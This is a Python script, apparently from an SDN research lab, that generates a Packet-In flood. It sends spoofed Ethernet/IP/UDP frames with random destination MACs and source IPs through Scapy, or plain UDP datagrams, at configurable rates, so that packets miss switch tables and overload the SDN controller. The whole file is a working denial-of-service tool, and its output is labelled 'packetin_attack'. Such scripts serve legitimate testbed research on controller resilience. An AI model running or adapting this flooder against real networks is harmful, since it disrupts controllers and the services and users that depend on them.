#!/usr/bin/env python3
"""
Packet-In stress generator.

Methods:
1. scapy: sends raw Ethernet/IP/UDP frames with random destination MACs.
   This is the best method for Packet-In saturation because each packet is
   likely to miss the switch table and reach the SDN controller.

2. udp: fallback standard-library UDP sender.
   This is less reliable for Packet-In saturation because ARP and learned
   switch flows can reduce controller involvement.
"""

import argparse
import csv
import random
import socket
import time


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def random_ip(prefix="10.0.0.", start=50, end=250):
    return "{}{}".format(prefix, random.randint(start, end))


def write_log(path, rows):
    if not path:
        return
    with open(path, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "total_packets_sent"])
        writer.writerows(rows)


def run_scapy(args):
    try:
        from scapy.all import Ether, IP, UDP, Raw, get_if_hwaddr, sendp
    except ImportError:
        raise SystemExit(
            "Scapy is not installed. Install with: sudo apt-get install python3-scapy"
        )

    src_mac = get_if_hwaddr(args.iface)
    payload = b"A" * max(1, args.size)
    burst_size = args.burst_size
    if burst_size <= 0:
        burst_size = max(1, min(100, int(max(args.rate, 1) / 100)))
    end_time = time.time() + args.duration
    start_perf = time.perf_counter()

    sent = 0
    rows = []
    last_log = time.time()

    def build_packet():
        dst_ip = args.target or random_ip(args.target_prefix, args.start_host, args.end_host)
        return (
            Ether(src=src_mac, dst=random_mac()) /
            IP(src=random_ip(args.target_prefix, args.start_host, args.end_host), dst=dst_ip) /
            UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535)) /
            Raw(payload)
        )

    while time.time() < end_time:
        packets = [build_packet() for _ in range(burst_size)]
        sendp(packets, iface=args.iface, verbose=False)
        sent += len(packets)

        now = time.time()
        if now - last_log >= 1.0:
            rows.append((now, sent))
            last_log = now

        if args.rate > 0:
            target_elapsed = sent / args.rate
            sleep_for = target_elapsed - (time.perf_counter() - start_perf)
            if sleep_for > 0:
                time.sleep(sleep_for)

    write_log(args.log, rows)
    elapsed = max(time.perf_counter() - start_perf, 0.000001)
    print(
        "packetin_attack method=scapy requested_rate_pps={} achieved_rate_pps={:.2f} sent_packets={}".format(
            args.rate,
            sent / elapsed,
            sent,
        ),
        flush=True,
    )


def run_udp(args):
    payload = b"A" * max(1, args.size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    delay = 0 if args.rate <= 0 else 1.0 / args.rate
    end_time = time.time() + args.duration

    sent = 0
    rows = []
    last_log = time.time()

    while time.time() < end_time:
        dst = args.target or random_ip(args.target_prefix, args.start_host, args.end_host)
        port = random.randint(1024, 65535)
        try:
            sock.sendto(payload, (dst, port))
            sent += 1
        except OSError:
            pass

        now = time.time()
        if now - last_log >= 1.0:
            rows.append((now, sent))
            last_log = now

        if delay > 0:
            time.sleep(delay)

    sock.close()
    write_log(args.log, rows)
    print("packetin_attack method=udp sent_packets={}".format(sent), flush=True)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--method", choices=["scapy", "udp"], default="scapy")
    parser.add_argument("--iface", default="h2-eth0", help="Interface to send raw frames from")
    parser.add_argument("--target", default=None)
    parser.add_argument("--target-prefix", default="10.0.0.")
    parser.add_argument("--start-host", type=int, default=50)
    parser.add_argument("--end-host", type=int, default=250)
    parser.add_argument("--rate", type=float, default=1200)
    parser.add_argument("--burst-size", type=int, default=0, help="Packets per Scapy sendp call; 0 auto-tunes from rate")
    parser.add_argument("--size", type=int, default=64)
    parser.add_argument("--duration", type=float, default=60)
    parser.add_argument("--log", default="attack_sent.csv")
    return parser.parse_args()


def main():
    args = parse_args()
    if args.method == "scapy":
        run_scapy(args)
    else:
        run_udp(args)


if __name__ == "__main__":
    main()
